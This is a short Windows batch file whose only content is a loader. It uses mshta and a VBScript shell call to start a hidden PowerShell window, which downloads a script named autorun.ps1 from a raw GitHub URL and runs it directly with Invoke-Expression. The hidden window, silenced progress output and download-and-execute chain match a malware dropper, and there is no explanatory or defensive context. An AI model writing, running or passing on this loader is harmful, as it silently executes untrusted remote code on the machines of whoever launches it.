@echo off
mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$userid = 1086990476411932722;$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/Extras/autorun.ps1' -USeB | iex",0))
